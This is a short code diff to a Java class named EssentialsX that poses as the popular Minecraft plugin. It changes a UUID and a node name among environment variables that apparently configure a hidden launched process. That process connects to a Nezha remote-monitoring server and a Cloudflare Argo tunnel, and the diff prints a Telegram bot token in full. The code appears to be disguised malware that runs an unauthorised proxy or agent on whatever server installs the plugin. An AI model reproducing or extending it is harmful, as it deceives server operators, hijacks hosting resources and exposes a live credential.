@@ -73,7 +73,7 @@ public class EssentialsX extends JavaPlugin {
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("UUID", "1afd1229-b893-5555-99cf-5107ce204913");
+        env.put("UUID", "1afd1229-b893-5575-99cf-5107ce204913");
         env.put("FILE_PATH", "./cache/java");
         env.put("NEZHA_SERVER", "nezha.kadcs.eu.org:443");
         env.put("NEZHA_PORT", "");
@@ -92,7 +92,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("BOT_TOKEN", "6779283566:AAE-fSGDSik8uy8VoACv4_tLJx6D0ApVSRQ");
         env.put("CFIP", "saas.sin.fan");
         env.put("CFPORT", "443");
-        env.put("NAME", "Seedloaf");
+        env.put("NAME", "Always");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
